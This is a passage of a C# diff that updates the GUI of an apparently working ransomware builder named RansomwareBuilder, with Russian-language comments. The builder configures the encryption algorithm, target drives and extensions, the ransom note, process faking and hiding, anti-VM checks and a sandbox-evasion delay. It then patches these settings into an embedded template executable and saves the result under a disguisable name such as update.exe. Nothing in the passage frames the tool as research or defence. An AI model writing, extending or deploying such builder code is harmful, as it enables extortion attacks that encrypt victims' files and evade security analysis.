+            namePanel.Controls.Add(CreateLabel("(например: update.exe)", grayColor, false));
             panel.Controls.Add(namePanel, 1, 0);
             
             // Путь сохранения
-            panel.Controls.Add(CreateLabel("Путь сохранения:"), 0, 1);
+            panel.Controls.Add(CreateLabel("Путь сохранения:", fgColor, true), 0, 1);
             var pathPanel = new FlowLayoutPanel();
             pathPanel.FlowDirection = FlowDirection.LeftToRight;
-            pathPanel.BackColor = Color.FromArgb(10, 10, 10);
+            pathPanel.BackColor = bgColor;
             
             txtOutputPath = new TextBox();
             txtOutputPath.Text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
             txtOutputPath.Width = 300;
-            txtOutputPath.BackColor = Color.FromArgb(17, 17, 17);
-            txtOutputPath.ForeColor = Color.FromArgb(0, 255, 65);
+            txtOutputPath.BackColor = darkColor;
+            txtOutputPath.ForeColor = fgColor;
             txtOutputPath.BorderStyle = BorderStyle.FixedSingle;
+            txtOutputPath.Font = new Font("Consolas", 10);
             pathPanel.Controls.Add(txtOutputPath);
             
             btnSelectPath = new Button();
             btnSelectPath.Text = "📂 Обзор";
-            btnSelectPath.BackColor = Color.FromArgb(17, 17, 17);
-            btnSelectPath.ForeColor = Color.FromArgb(0, 255, 65);
+            btnSelectPath.BackColor = darkColor;
+            btnSelectPath.ForeColor = fgColor;
             btnSelectPath.FlatStyle = FlatStyle.Flat;
+            btnSelectPath.Font = new Font("Consolas", 10);
             btnSelectPath.Click += (s, e) => {
                 using (var fbd = new FolderBrowserDialog())
                 {
@@ -516,21 +681,23 @@ namespace RansomwareBuilder
             panel.Controls.Add(pathPanel, 1, 1);
             
             // Иконка
-            panel.Controls.Add(CreateLabel("Иконка для EXE (.ico):"), 0, 2);
+            panel.Controls.Add(CreateLabel("Иконка для EXE (.ico):", fgColor, true), 0, 2);
             var iconPanel = new FlowLayoutPanel();
             iconPanel.FlowDirection = FlowDirection.LeftToRight;
-            iconPanel.BackColor = Color.FromArgb(10, 10, 10);
+            iconPanel.BackColor = bgColor;
             
             var lblIcon = new Label();
             lblIcon.Text = "Не выбрано (будет стандартная)";
-            lblIcon.ForeColor = Color.Gray;
+            lblIcon.ForeColor = grayColor;
+            lblIcon.BackColor = bgColor;
             iconPanel.Controls.Add(lblIcon);
             
             btnSelectIcon = new Button();
             btnSelectIcon.Text = "📂 Выбрать";
-            btnSelectIcon.BackColor = Color.FromArgb(17, 17, 17);
-            btnSelectIcon.ForeColor = Color.FromArgb(0, 255, 65);
+            btnSelectIcon.BackColor = darkColor;
+            btnSelectIcon.ForeColor = fgColor;
             btnSelectIcon.FlatStyle = FlatStyle.Flat;
+            btnSelectIcon.Font = new Font("Consolas", 10);
             btnSelectIcon.Click += (s, e) => {
                 using (var ofd = new OpenFileDialog())
                 {
@@ -539,7 +706,7 @@ namespace RansomwareBuilder
                     {
                         txtIconPath.Text = ofd.FileName;
                         lblIcon.Text = Path.GetFileName(ofd.FileName);
-                        lblIcon.ForeColor = Color.FromArgb(0, 255, 65);
+                        lblIcon.ForeColor = fgColor;
                     }
                 }
             };
@@ -549,21 +716,24 @@ namespace RansomwareBuilder
             txtIconPath.Visible = false;
             iconPanel.Controls.Add(txtIconPath);
             
-            iconPanel.Controls.Add(CreateLabel("(только .ico)", Color.Gray));
+            iconPanel.Controls.Add(CreateLabel("(только .ico)", grayColor, false));
             panel.Controls.Add(iconPanel, 1, 2);
             
             tab.Controls.Add(panel);
             return tab;
         }
         
-        private Label CreateLabel(string text, Color? color = null)
+        // ============================================================
+        // ВСПОМОГАТЕЛЬНЫЕ МЕТОДЫ
+        // ============================================================
+        private Label CreateLabel(string text, Color color, bool bold)
         {
             var lbl = new Label();
             lbl.Text = text;
-            lbl.ForeColor = color ?? Color.FromArgb(0, 255, 65);
-            lbl.Font = new Font("Segoe UI", 10, FontStyle.Bold);
+            lbl.ForeColor = color;
+            lbl.Font = new Font(bold ? "Segoe UI" : "Segoe UI", bold ? 10 : 9, bold ? FontStyle.Bold : FontStyle.Regular);
             lbl.AutoSize = true;
-            lbl.BackColor = Color.FromArgb(10, 10, 10);
+            lbl.BackColor = bgColor;
             return lbl;
         }
         
@@ -594,10 +764,19 @@ namespace RansomwareBuilder
             chkC.Checked = true;
         }
         
+        // ============================================================
+        // ОСНОВНАЯ ЛОГИКА СБОРКИ
+        // ============================================================
         private void BtnBuild_Click(object sender, EventArgs e)
         {
             try
             {
+                // Обновляем статус
+                lblStatus.Text = "⏳ Начинаем сборку...";
+                lblStatus.ForeColor = yellowColor;
+                progressBar.Visible = true;
+                btnBuild.Enabled = false;
+                
                 // 1. Собираем параметры
                 string algorithm = cbAlgorithm.SelectedItem?.ToString() ?? "AES-256";
                 int algoValue = algorithm == "AES-256" ? 0 : algorithm == "Salsa20" ? 1 : 2;
@@ -611,6 +790,10 @@ namespace RansomwareBuilder
                 if (selectedDrives.Count == 0)
                 {
                     MessageBox.Show("Выберите хотя бы один диск!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    btnBuild.Enabled = true;
+                    progressBar.Visible = false;
+                    lblStatus.Text = "❌ Ошибка: выберите диск";
+                    lblStatus.ForeColor = errorColor;
                     return;
                 }
                 
@@ -624,6 +807,8 @@ namespace RansomwareBuilder
                 string outputName = txtOutputName.Text;
                 string outputPath = txtOutputPath.Text;
                 
+                lblDetail.Text = "📋 Сбор параметров...";
+                
                 // 2. Извлекаем шаблон из ресурсов
                 byte[] template;
                 using (var stream = GetType().Assembly.GetManifestResourceStream("RansomwareBuilder.template.exe"))
@@ -631,33 +816,32 @@ namespace RansomwareBuilder
                     if (stream == null)
                     {
                         MessageBox.Show("Шаблон не найден в ресурсах! template.exe должен быть встроен.", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        btnBuild.Enabled = true;
+                        progressBar.Visible = false;
+                        lblStatus.Text = "❌ Ошибка: шаблон не найден";
+                        lblStatus.ForeColor = errorColor;
                         return;
                     }
                     template = new byte[stream.Length];
                     stream.Read(template, 0, template.Length);
                 }
                 
+                lblDetail.Text = "🔧 Патчинг шаблона...";
+                
                 // 3. Патчим шаблон (замена байт)
-                // Алгоритм
                 byte[] algoBytes = BitConverter.GetBytes(algoValue);
                 ReplacePattern(template, new byte[] { 0xEF, 0xBE, 0xAD, 0xDE }, algoBytes);
                 
-                // Диски
                 string drivesStr = string.Join("|", selectedDrives);
                 ReplaceString(template, "|DRIVES|", drivesStr);
                 
-                // Расширения
                 string extsStr = string.Join("|", selectedExts);
                 ReplaceString(template, "|EXTS|", extsStr);
                 
-                // Расширение зашифрованных
                 ReplaceString(template, "|ENC_EXT|", encryptedExt);
-                
-                // Имя и текст выкупа
                 ReplaceString(template, "|NOTE_NAME|", noteName);
                 ReplaceString(template, "|NOTE_CONTENT|", noteContent);
                 
-                // Включение скрытности
                 ReplaceByte(template, "|FAKE_ENABLED|", chkFakeProcess.Checked ? (byte)1 : (byte)0);
                 ReplaceByte(template, "|HIDE_ENABLED|", chkHideProcess.Checked ? (byte)1 : (byte)0);
                 ReplaceByte(template, "|ANTIVM_ENABLED|", chkAntiVM.Checked ? (byte)1 : (byte)0);
@@ -666,33 +850,46 @@ namespace RansomwareBuilder
                 ReplaceByte(template, "|HIDEFILES_ENABLED|", chkHideFilesAttr.Checked ? (byte)1 : (byte)0);
                 ReplaceByte(template, "|DELAY_ENABLED|", chkSandboxDelay.Checked ? (byte)1 : (byte)0);
                 
-                // Имя фейк-процесса
                 ReplaceString(template, "|FAKE_NAME|", txtFakeProcessName.Text);
-                
-                // Папки для шифрования и обхода
                 ReplaceString(template, "|INCLUDE_FOLDERS|", txtIncludeFolders.Text.Replace("\r\n", "|").Replace("\n", "|"));
                 ReplaceString(template, "|EXCLUDE_FOLDERS|", txtExcludeFolders.Text.Replace("\r\n", "|").Replace("\n", "|"));
                 
-                // Обои
                 if (!string.IsNullOrEmpty(wallpaperPath))
                 {
                     string base64 = Convert.ToBase64String(File.ReadAllBytes(wallpaperPath));
                     ReplaceString(template, "|WALLPAPER|", base64);
                 }
                 
+                lblDetail.Text = "💾 Сохранение ransomware.exe...";
+                
                 // 4. Сохраняем
                 string finalPath = Path.Combine(outputPath, outputName);
                 File.WriteAllBytes(finalPath, template);
                 
                 long sizeKB = new FileInfo(finalPath).Length / 1024;
+                lblStatus.Text = "✅ Успех!";
+                lblStatus.ForeColor = successColor;
+                lblDetail.Text = $"📁 {finalPath} | Размер: {sizeKB} КБ";
+                
                 MessageBox.Show($"✅ Файл создан!\n\n📁 {finalPath}\n\nРазмер: {sizeKB} КБ", "✅ Успех", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
             catch (Exception ex)
             {
+                lblStatus.Text = "❌ Ошибка!";
+                lblStatus.ForeColor = errorColor;
+                lblDetail.Text = ex.Message;
                 MessageBox.Show($"Ошибка: {ex.Message}\n\n{ex.StackTrace}", "❌ Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+            finally
+            {
+                btnBuild.Enabled = true;
+                progressBar.Visible = false;
             }
         }
         
+        // ============================================================
+        // ФУНКЦИИ ПАТЧИНГА
+        // ============================================================
         private void ReplacePattern(byte[] data, byte[] pattern, byte[] replacement)
         {
             for (int i = 0; i < data.Length - pattern.Length; i++)
@@ -728,7 +925,6 @@ namespace RansomwareBuilder
                     int maxLen = Math.Min(valueBytes.Length, placeholderBytes.Length - 1);
                     for (int j = 0; j < maxLen; j++)
                         data[i + j] = valueBytes[j];
-                    // Оставляем завершающий ноль
                     for (int j = maxLen; j < placeholderBytes.Length; j++)
                         data[i + j] = 0;
                     return;
